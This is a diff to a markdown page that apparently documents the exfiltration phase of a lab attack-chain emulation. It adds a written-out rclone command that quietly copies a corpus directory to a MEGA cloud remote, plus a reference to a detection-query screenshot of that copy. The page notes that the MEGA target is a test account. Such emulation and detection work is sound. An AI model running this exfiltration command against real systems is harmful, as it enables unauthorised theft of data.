@@ -1,5 +1,12 @@
 # Exfiltration
 
+## Tooling
+
+```text
+rclone.exe --config C:\ProgramData\rclone.conf copy C:\C0015\corpus Mega:DATA -q --ignore-existing --auto-confirm
+```
+
+
 | | |
 |---|---|
 | Chain phase | Exfiltration |
@@ -32,3 +39,9 @@ The task's own verifier records the outcome in `fs01_task.log`:
 
 `exit=0; errors=0` proves the command completed; it does not prove what the remote holds. No receiver
 inventory is captured, and the lab's MEGA target is a test account.
+
+### Query screenshots (run-6)
+
+![Query 33](../../../detections/queries/33-rclone/screenshot.jpg)
+
+`rclone.exe` copying the corpus to `Mega:DATA`, `fs01`.
